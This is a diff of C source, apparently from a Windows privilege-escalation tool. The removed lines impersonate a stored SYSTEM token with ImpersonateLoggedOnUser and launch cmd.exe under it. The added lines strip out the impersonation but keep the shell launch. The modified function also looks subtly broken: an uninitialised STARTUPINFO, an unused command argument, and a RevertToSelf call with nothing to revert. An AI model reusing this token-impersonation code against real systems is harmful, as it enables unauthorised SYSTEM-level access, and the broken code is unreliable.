@@ -192,27 +192,19 @@ int WMICCreateProcess(PWCHAR Command)
 
 int SystemCreateProcess(PWCHAR Command)
 {
-    if (hSystemToken == INVALID_HANDLE_VALUE) {
-        wprintf(L"[!] System  Token is NULL....\n");
+    
+    
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+   
+    wprintf(L"[+] Command : %s !\n", Command);
+    WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
+    if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi) == 0) {
+        wprintf(L"[!] CreateProcess Error %d !\n",GetLastError());
+        RevertToSelf();
         return 0;
     }
-    if (ImpersonateLoggedOnUser(hSystemToken)) {
-        wprintf(L"[+] ImpersonateLoggedOnUser Success!\n");
-        STARTUPINFO si;
-        PROCESS_INFORMATION pi;
-        wprintf(L"[+] Command : %s !\n", Command);
-        WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
-        if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi) == 0) {
-            wprintf(L"[!] CreateProcess Error %d !\n",GetLastError());
-            RevertToSelf();
-            return 0;
-        }
-        else {
-            wprintf(L"[+] CreateProcess Success !\n");
-            RevertToSelf();
-            return 0;
-        }
-    }
+     
     return 0;
 }
 
